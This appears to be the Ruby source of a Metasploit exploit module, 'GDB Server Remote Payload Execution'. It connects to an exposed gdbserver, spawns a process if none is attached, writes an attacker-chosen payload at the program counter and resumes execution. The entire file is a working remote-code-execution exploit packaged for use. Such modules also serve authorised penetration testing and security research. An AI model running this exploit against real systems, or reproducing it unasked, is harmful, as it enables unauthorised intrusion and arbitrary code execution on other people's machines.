# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Gdb

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;          => &#039;GDB Server Remote Payload Execution&#039;,
      &#039;Description&#039;   => %q{
          This module attempts to execute an arbitrary payload on a loose gdbserver service.
      },
      &#039;Author&#039;        => [ &#039;joev&#039; ],
      &#039;Targets&#039;       => [
        [ &#039;x86 (32-bit)&#039;,    { &#039;Arch&#039; => ARCH_X86 } ],
        [ &#039;x86_64 (64-bit)&#039;, { &#039;Arch&#039; => ARCH_X86_64 } ]
      ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://github.com/rapid7/metasploit-framework/pull/3691&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Aug 24 2014&#039;,
      &#039;Platform&#039;      => %w(linux unix osx),
      &#039;DefaultTarget&#039; => 0,
      &#039;DefaultOptions&#039; => {
        &#039;PrependFork&#039; => true
      }
    ))

    register_options([
      OptString.new(&#039;EXE_FILE&#039;, [
        false,
        "The exe to spawn when gdbserver is not attached to a process.",
        &#039;/bin/true&#039;
      ])
    ], self.class)
  end

  def exploit
    connect

    print_status "Performing handshake with gdbserver..."
    handshake

    enable_extended_mode

    begin
      print_status "Stepping program to find PC..."
      gdb_data = process_info
    rescue BadAckError, BadResponseError
      # gdbserver is running with the --multi flag and is not currently
      # attached to any process. let&#039;s attach to /bin/true or something.
      print_status "No process loaded, attempting to load /bin/true..."
      run(datastore[&#039;EXE_FILE&#039;])
      gdb_data = process_info
    end

    gdb_pc, gdb_arch = gdb_data.values_at(:pc, :arch)

    unless payload.arch.include? gdb_arch
      fail_with(
        Msf::Exploit::Failure::BadConfig,
        "The payload architecture is incorrect: "+
        "the payload is #{payload.arch.first}, but #{gdb_arch} was detected from gdb."
      )
    end

    print_status "Writing payload at #{gdb_pc}..."
    write(payload.encoded, gdb_pc)

    print_status "Executing the payload..."
    continue

    handler
    disconnect
  end

end

